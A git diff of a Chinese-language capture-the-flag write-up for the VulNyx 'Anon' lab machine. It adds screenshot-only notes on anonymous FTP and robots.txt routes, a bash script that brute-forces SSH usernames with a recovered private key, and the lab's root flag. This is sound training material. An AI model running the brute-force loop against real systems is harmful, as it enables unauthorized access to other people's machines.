@@ -3,7 +3,7 @@ title: VulNyx Anon靶机复盘
 author: LingMj
 data: 2025-02-05
 categories: [VulNyx]
-tags: [upload]
+tags: [nmap,respose,chisel,brute_name,docker]
 description: 难度-Medium
 ---
 
@@ -119,7 +119,7 @@ Nmap done: 256 IP addresses (3 hosts up) scanned in 27.20 seconds
 
 ![图 13](../assets/images/5cbc1a8197d84a7a1f4885e8619d3904d00366c76234be9c130b6c5e6a3e3331.png)  
 
->好到这里结束了，非常有意思的靶场，不过上面每一样是我写的，后面复盘会补充自己的其他方案
+>好到这里结束了，非常有意思的靶场，不过上面没一样是我写的，后面复盘会补充自己的其他方案
 >
 
 
@@ -127,3 +127,41 @@ Nmap done: 256 IP addresses (3 hosts up) scanned in 27.20 seconds
 >
 >rootflag:f3a421bdd1e5119f49c3fda29838cf79
 >
+
+
+>其他补充：21匿名登录的方案和robots.txt方案
+>
+
+![图 14](../assets/images/28846667b2f26519e8e3a548c5d61395a7949780767c56d944ba5864547b05e3.png)  
+![图 15](../assets/images/faed8578c297f3ae6c6f7503226aa8c3bfd76805ba1de1f6b1cd4f1ca0d26d75.png)  
+![图 16](../assets/images/09738ec9ecadb71bca9d9189d6586a193c235e6086a1c0ec4737cf582cc7ef9c.png)  
+![图 17](../assets/images/e33191e5ff606d342503dbe34b996ee7f78f22585f3b5e1c57d3637b5208488c.png)  
+![图 18](../assets/images/3140a40f7cfaf80046c5cdcfbcbfe80e30b0920c88c3fad196ab3ff3a249fccd.png)  
+
+![图 19](../assets/images/b2cfd4e60566d327522885cecfdc50e6a5acff59eafa586dab17dde60fe16d07.png)  
+![图 20](../assets/images/9b3cebdd7096df62b1e6baa5c255690ac0a838ac9e0c16c7d129ac81e9f6c1d2.png)  
+
+>当然美化爆破ssh的方案也有
+>
+
+
+```
+#!/bin/bash
+
+host=your_host
+user_file=brute_name_file
+id_rsa_file=your_id_rsa
+
+
+while read i
+do
+    timeout 1 ssh ${i}@$host -i $id_rsa_file id &>/dev/null
+    if [ $? -eq 0 ];then
+        echo "[+]Found: $i"
+        break
+    else
+        echo "[-]test:  $i"
+    fi
+    sleep 0.1
+done < $user_file
+```
